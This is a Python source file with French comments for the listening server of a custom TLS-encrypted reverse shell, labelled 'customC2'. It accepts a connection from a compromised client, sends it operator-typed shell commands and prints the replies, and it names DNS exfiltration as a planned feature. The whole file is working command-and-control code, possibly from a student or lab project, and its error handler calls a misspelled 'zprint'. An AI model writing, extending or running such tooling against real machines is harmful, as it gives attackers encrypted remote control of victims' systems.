# server_revershell
# Version 0.4
# Auteur : Raphaël KATHALUWA-LIYANAGE

# import des libraires
import socket       # communication entre l'attaque et la cible
import ssl          # chiffrement des échanges
#import dns_server   # exfiltration des données via DNS

# en écoute sur toutes les connexions entrantes
# 0.0.0.0:25566
HOST = '0.0.0.0'
PORT = 25566
CERTIFICATE = "./chiffrement/python_ssl.pem"
KEY = "./chiffrement/python_ssl_priv.key"
# taille des messages : 128kB max
BUFFER_SIZE = 1024 * 128

# Créer une socket TCP/IP
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind((HOST, PORT))
sock.listen(1)

# Envelopper la socket dans un contexte SSL
context =  ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
# chargement du certificat et de la clé privée RSA
context.load_cert_chain(certfile=CERTIFICATE, keyfile=KEY)

while sock:
    print(f"[*] Listening to {HOST}:{PORT}...")
    conn, addr = sock.accept()

    # Envelopper la connexion entrante dans un contexte SSL
    connssl = context.wrap_socket(conn, server_side=True)
    print(f"[+] Session encrypted in {connssl.version()}")

    try:
        print(f"[+] Client connected : {addr}")
        while True:
            command = input("(customC2) $ ")
            if command == ":exit":
                print('quitting console')
                sock.shutdown(socket.SHUT_RDWR)
                conn.shutdown(socket.SHUT_RDWR)
                sock.close()
                conn.close()
                exit(0)
            connssl.sendall(command.encode())
            reply = connssl.recv(BUFFER_SIZE)
            if not reply:
                break
            print(reply.decode())
    except Exception:
        zprint(f"[-] Fatal error: killing session with {addr}")
        exit(-1)
    finally:
        connssl.shutdown(socket.SHUT_RDWR)
        connssl.close()
        exit(0)